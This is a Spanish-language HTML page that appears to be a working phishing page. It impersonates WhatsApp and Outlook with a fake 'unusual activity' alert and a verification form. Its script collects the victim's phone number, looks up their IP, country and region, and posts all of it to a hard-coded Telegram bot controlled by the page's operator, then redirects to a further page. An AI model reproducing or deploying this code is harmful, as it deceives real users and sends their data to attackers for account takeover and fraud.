<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>Alerta de Actividad Sospechosa - WhatsApp</title>
  <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css" />
  <style>
    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      padding: 0;
      overflow-x: hidden; /* Bloquea desplazamiento horizontal */
      width: 100vw;
      max-width: 100vw;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      width: 100%;
      max-width: 100vw;
      text-align: center;
    }

    form {
      width: 100%;
      max-width: 400px;
    }

    select, input, button {
      width: 100%;
      margin: 10px 0;
      padding: 12px;
    }

    #popup, footer {
      width: 100%;
      text-align: center;
    }

    img {
      max-width: 100%;
      height: auto;
    }
  </style>
</head>
<body>

  <div id="popup">
    <div class="popup-content">
      <h2>Actividad Inusual Detectada</h2>
      <p>Hemos detectado actividades inusuales de parte de su cuenta de Outlook. Para seguir usándola normalmente, realice una verificación.</p>
      <img src="https://sappsapp23.sirv.com/docs/21-18-05-265_512.gif" alt="Cargando...">
    </div>
  </div>

  <header></header>

  <div class="content" style="display: none;">
    <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="250" alt="Logo WhatsApp" style="max-width: 100%;">
    <p>Ingrese su número de teléfono para sincronizar su cuenta de WhatsApp con Outlook:</p>
    <form id="loginForm">
      <select id="country" required>
        <option value="" disabled selected>Selecciona tu país</option>
        <option value="+54">🇦🇷 Argentina</option>
        <option value="+591">🇧🇴 Bolivia</option>
        <option value="+55">🇧🇷 Brasil</option>
        <option value="+56">🇨🇱 Chile</option>
        <option value="+57">🇨🇴 Colombia</option>
        <option value="+506">🇨🇷 Costa Rica</option>
        <option value="+53">🇨🇺 Cuba</option>
        <option value="+1">🇩🇴 República Dominicana</option>
        <option value="+593">🇪🇨 Ecuador</option>
        <option value="+503">🇸🇻 El Salvador</option>
        <option value="+502">🇬🇹 Guatemala</option>
        <option value="+504">🇭🇳 Honduras</option>
        <option value="+52">🇲🇽 México</option>
        <option value="+505">🇳🇮 Nicaragua</option>
        <option value="+507">🇵🇦 Panamá</option>
        <option value="+595">🇵🇾 Paraguay</option>
        <option value="+51">🇵🇪 Perú</option>
        <option value="+1">🇵🇷 Puerto Rico</option>
        <option value="+598">🇺🇾 Uruguay</option>
        <option value="+58">🇻🇪 Venezuela</option>
      </select>
      <input type="tel" id="telefono" name="telefono" placeholder="Número de teléfono" required>
      <button type="submit" id="submitButton">Continuar</button>
    </form>
  </div>

  <footer>
    <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp" style="max-width: 100%;">
  </footer>

  <script>
    window.onload = function () {
      setTimeout(function () {
        document.getElementById('popup').style.display = 'none';
        document.querySelector('.content').style.display = 'flex';
      }, 5000);

      const countrySelect = document.getElementById('country');
      const phoneInput = document.getElementById('telefono');

      countrySelect.addEventListener('change', function () {
        phoneInput.value = countrySelect.value;
      });

      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          const countryMap = {
            'AR': '+54', 'BO': '+591', 'BR': '+55', 'CL': '+56', 'CO': '+57',
            'CR': '+506', 'CU': '+53', 'DO': '+1', 'EC': '+593', 'SV': '+503',
            'GT': '+502', 'HN': '+504', 'MX': '+52', 'NI': '+505', 'PA': '+507',
            'PY': '+595', 'PE': '+51', 'PR': '+1', 'UY': '+598', 'VE': '+58'
          };
          countrySelect.value = countryMap[data.country_code] || '';
        })
        .catch(error => console.error('Error al obtener la ubicación:', error));
    }
  </script>

  <script>
    var telegram_bot_id = "7588596909:AAEv6ZNnIAsJNAcLW8KzGJJkzT33pyfWqUU";
    var chat_id = "-4810900191";

    document.addEventListener("DOMContentLoaded", function () {
      function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
        fetch('https://ipapi.co/json/')
          .then(response => response.json())
          .then(data => {
            var country = data.country_name;
            var region = data.region;
            var ip = data.ip;
            message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
            enviarMensajeTelegram(message, nextPage);
          })
          .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            enviarMensajeTelegram(message + "\nError al obtener la ubicación.", nextPage);
          });
      }

      function enviarMensajeTelegram(mensaje, nextPage) {
        fetch('https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chat_id, text: mensaje })
        })
        .then(response => {
          if (!response.ok) throw new Error('Error al enviar el mensaje.');
          window.location.href = nextPage;
        })
        .catch(error => console.error('Error al enviar el mensaje:', error));
      }

      var loginForm = document.getElementById("loginForm");
      if (loginForm) {
        loginForm.addEventListener("submit", function (event) {
          event.preventDefault();
          var telefono = document.getElementById("telefono").value;
          obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "loading.html?action=telefono", "💲 Whatsapp 💲:\nTELEFONO: " + telefono);
        });
      }
    });
  </script>
</body>
</html>
